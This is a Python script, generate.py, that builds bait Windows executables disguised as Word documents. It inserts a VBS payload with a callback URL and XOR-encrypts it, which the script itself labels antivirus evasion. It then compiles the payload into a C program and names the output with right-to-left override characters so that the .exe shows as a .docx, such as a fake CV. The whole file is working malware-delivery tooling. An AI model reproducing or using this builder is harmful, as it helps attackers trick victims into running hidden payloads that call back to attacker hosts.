import argparse
import os
import subprocess
import pathlib
import time
parser = argparse.ArgumentParser(
    prog='generate.py',
    description='Generate a bait executable, disguised as a docx',
    usage='generate.py -p disguisedshell.vbs -a CALLBACK_URL=http://localhost:80/ FILE_URL=https://cdn.create.microsoft.com/catalog-assets/en-us/972db91c-baf9-4c6b-9605-00b3aa24e07c/TF972db91c-baf9-4c6b-9605-00b3aa24e07c06706e45_wac-21b6606d1277.docx FILE_OUTPUT_NAME=CV-of-Alexe.docx -o CV-of-Al  -s **[]!?**')
parser.add_argument(
    "-o", "--out", help="Output file name (without extension)")
parser.add_argument("-p", "--payload", help="Payload to use")
parser.add_argument("-a", "--arguments", nargs="*", help="Payload arguments")
parser.add_argument(
    "-s", "--secret", help="Secret to encrypt payload (AV evasion)")


def main():
    args = parser.parse_args()

    p = pathlib.Path(__file__).parent.resolve()
    payload_args_dict = generate_payload_args_dict(args.arguments)
    c_file = create_payload(p, args.payload, payload_args_dict, args.secret)
    compile(p, c_file, args.out)


def generate_payload_args_dict(arguments: list):
    result = {}
    for a in arguments:
        splitted = a.split("=")
        result[splitted[0]] = splitted[1]
    return result


def create_payload(p: pathlib.Path, payload: str, arguments: dict, secret: str):
    with open(f"{p}\\..\\payloads\\{payload}", 'r') as f:
        vbs_script = f.read()
        vbs_script = replace_args(vbs_script, arguments)

        encrypted_payload = get_encrypted_payload(vbs_script, secret)
        temp_file_name = get_temp_name()
        create_temp_c_file(p, encrypted_payload, secret, temp_file_name)
    return temp_file_name


def get_encrypted_payload(script: str, secret: str):
    result = "{"
    for i in range(len(script)):
        xored = ord(script[i]) ^ ord(secret[i % len(secret)])
        result += f"{str(xored+1)},"
    result += "0}"
    return result


def create_temp_c_file(p: pathlib.Path, payload: str, secret: str, temp_file_name: str):
    with open(f"{p}\\..\\src\\runscript.c", 'r') as f:
        c_file_content = f.read()
        splitted = c_file_content.split("//SCRIPT COMES HERE")
        new_content = f"\nchar sc[] = {payload};\nchar s[] = \"{secret}\";\n".join(
            splitted)
    with open(f"{p}\\..\\build\\{temp_file_name}", 'w') as f:
        f.write(new_content)


def replace_args(script: str, arguments: dict):
    for k, v in arguments.items():
        script = script.replace(f"%{k}%", v)
    return script


def get_temp_name():
    return f"temp_{int(time.time())}.c"


def compile(p: pathlib.Path, c_temp_file: str, output_jpg_name: str):
    process = subprocess.Popen(
        f'"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\Tools\\VsDevCmd.bat" && windres ..\\resources\\resources.rc -O coff --target pe-i386 -o ..\\resources\\resources.res && cl ..\\build\\{c_temp_file} ..\\resources\\resources.res /DEBUG:NONE /O1 /link /subsystem:windows /entry:mainCRTStartup /out:\"{p}\\..\\build\\{output_jpg_name}‮x‮c‮‮o‮‮‮d‮​.exe\"', shell=True, env=os.environ, cwd=f'{p}\\..\\src')
    process.wait()
    os.remove(f"{p}\\..\\build\\{c_temp_file}")
    temp_obj_file = c_temp_file.split(".")[0] + ".obj"
    os.remove(f"{p}\\..\\src\\{temp_obj_file}")


if __name__ == "__main__":
    main()
